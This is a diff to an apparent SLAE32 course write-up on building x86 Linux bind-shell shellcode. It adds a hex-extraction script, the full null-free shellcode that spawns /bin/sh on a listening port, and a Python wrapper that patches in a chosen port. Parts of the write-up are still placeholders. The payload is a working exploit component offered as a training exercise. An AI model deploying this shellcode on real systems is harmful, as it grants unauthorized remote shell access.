@@ -568,27 +568,95 @@ _start:
 ```
 
 Dumping the hex for usage:
+To extract our hex values for our shell, we can use the following shell script (dump_hex.sh) along with the target object to extract the hex values in a usable fashion. The output can be taken and placed directly into the following python wrapper.
 
 ```
 root@kali:~/Documents/slae32/misc# cat dump_hex.sh 
-objdump -d "$1" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+objdump -d "$1" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 ```
 
 Usage:
 
 ```
-root@kali:~/Documents/slae32/misc/second_bind_shell# ../dump_hex.sh second_bind_shell
-"\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x89\xc7\xb1\x03\xb0\x3f\x89\xfb\x49\xcd\x80\x75\xf7\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
+root@kali:~/Documents/slae32/exercise_1# ../misc/dump_hex.sh second_bind_shell/second_bind_shell
+"\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\xcd\\x80\\x89\\xc7\\xb1\\x03\\xb0\\x3f\\x89\\xfb\\x49\\xcd\\x80\\x75\\xf7\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
 ```
 
-As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell.
+As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell. The output also includes two \'s because the actual value, allowing direct usage within a python string. We need the two back slash characters to ensure a single \ remains in the final output.
 
 ## Custom port number:
 The issue with this shell at the moment, is the static port value used within the defined struct. In order to change the port number we currently need to either open the .asm file, tweak the hex number that is pushed onto the stack and rebuild the shell or remember which hex values in the entire hex string above reference the port.
 
 The more logical solution would be to create a little tool, or wrapper, that takes a user defined integer value, converts this value to hex and then replaces the current port number value before dumping the hex to the screen for use.
 
-todo - write python wrapper and place here
+The following script is a python wrapper that I have made to allow a custom port to be placed into the script, replacing the hard coded value within the final hex output.
+
+```
+root@kali:~/Documents/slae32/exercise_1# cat wrapper.py 
+import sys
+import socket
+
+shellcode = (
+        "\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x66"
+        "\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68[p2][p1]"
+        "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66\\xb8\\x6b\\x01"
+        "\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31"
+        "\\xc9\\x31\\xd2\\xcd\\x80\\x89\\xc7\\xb1\\x03\\xb0\\x3f\\x89\\xfb"
+        "\\x49\\xcd\\x80\\x75\\xf7\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68"
+        "\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2"
+        "\\xb0\\x0b\\xcd\\x80"
+)
+
+if len(sys.argv) != 2:
+        print 'Usage: ' + sys.argv[0] + ' <port>'
+        sys.exit()
+
+port = sys.argv[1]
+print "Chosen port: %s" % port
+
+int_port = int(port)
+if int_port > 65535:
+        print "Port choice is greater than max value (65535)"
+        sys.exit()
+
+htons_port_val = socket.htons(int_port)
+hex_port_value = hex(htons_port_val)
+
+cleaned_hex_port = hex_port_value.replace("0x", "")
+first_port_val = "\\x" + cleaned_hex_port[:2]
+second_port_val = "\\x" + cleaned_hex_port[2:]
+
+print "1st port: %s" % first_port_val
+print "2nd port: %s" % second_port_val
+print ""
+
+print "Ammending shellcode..."
+
+shellcode = shellcode.replace("[p2]", second_port_val)
+shellcode = shellcode.replace("[p1]", first_port_val)
+
+print "Final Shellcode:"
+print shellcode
+```
+
+As we can see in the above shellcode value, there are two placeholder values [p2] and [p1], these are the two hex values that are replaced with the target port, specified at runtime. Once edited, the final shellcode is output to the screen, as seen in the following usage example:
+
+```
+root@kali:~/Documents/slae32/exercise_1# python wrapper.py 9001
+Chosen port: 9001
+1st port: \x29
+2nd port: \x23
+
+Ammending shellcode...
+Final Shellcode:
+\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x89\xc7\xb1\x03\xb0\x3f\x89\xfb\x49\xcd\x80\x75\xf7\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80
+```
+
+Our final step is to utilise this hex output within an executable that injects the shellcode directly into the process memory and executes it, binding out shell. This can be completed in various languages, for example C# is an ideal candidate for a Windows shell. As I am working within a Unix environment I wrote my executable in C.
+
+```
+place C wrapper here
+```
 
 ## Additional:
 todo
